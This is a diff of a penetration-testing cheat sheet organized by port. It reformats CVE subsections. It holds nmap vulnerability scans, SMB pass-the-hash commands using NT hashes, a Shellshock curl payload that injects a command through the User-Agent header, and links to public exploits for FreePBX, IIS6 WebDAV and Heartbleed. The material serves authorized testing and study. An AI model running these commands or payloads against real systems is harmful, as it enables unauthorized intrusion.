@@ -25,7 +25,6 @@ ssh -i 'SECRETKEY' 'USERNAME@IP'
 ```
 
 
-
 ## 25
 - swaks
 ```sh
@@ -60,16 +59,15 @@ ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 ```sh
 nmap -n -Pn -p80 --script=http-methods 'IP'
 ```
-### CVE
-- shellshock
-  ```sh
-  # CVE-2014-6271
-  curl -A "() { :;}; COMMAND" 'URL'
-  ```
-  https://github.com/mubix/shellshocker-pocs?tab=readme-ov-file#command-line-linux-osx-and-windows-via-cygwin
-- CVE-2012-4869 - FreePBX = 2.9/2.10
-- [CVE-2017-7269](https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269/) - Windows Server 2003 R2 IIS6.0 webdav
-
+- CVE
+  - shellshock
+    ```sh
+    # CVE-2014-6271
+    curl -A "() { :;}; COMMAND" 'URL'
+    ```
+    https://github.com/mubix/shellshocker-pocs?tab=readme-ov-file#command-line-linux-osx-and-windows-via-cygwin
+  - CVE-2012-4869 - FreePBX = 2.9/2.10
+  - [CVE-2017-7269](https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269/) - Windows Server 2003 R2 IIS6.0 webdav
 
 
 ## 88
@@ -282,7 +280,7 @@ nmap -n -Pn -p443 --script=ssl-heartbleed 'IP'
 ```sh
 sslscan --no-check-certificate --no-ciphersuites --no-compression --no-fallback --no-groups --no-heartbleed --no-renegotiation 'IP'
 ```
-- PoC
+- CVE
   - [heartbleed](https://github.com/sensepost/heartbleed-poc)
 
 
@@ -541,11 +539,11 @@ smbclient -U 'DOMAIN/USERNAME%NT HASH' --pw-nt-hash -c 'COMMAND' '//HOST/SHARE'
 smbmap -H 'IP' -u 'USERNAME' -p 'PASSWORD or NTLM HASH' -d 'DOMAIN' -g 'OUTPUT.txt'
 smbmap -H 'IP' -u 'USERNAME' -p 'PASSWORD or NTLM HASH' -d 'DOMAIN' -r 'Recursively FILE' --depth 'DEPTH' -g 'OUTPUT.txt'
 ```
-### CVE
-- eternalblue
-  ```sh
-  nmap -n -Pn -p445 --script=smb-vuln-ms17-010 'IP'
-  ```
+- CVE
+  - eternalblue
+    ```sh
+    nmap -n -Pn -p445 --script=smb-vuln-ms17-010 'IP'
+    ```
 
 
 ## 5060 (UDP)
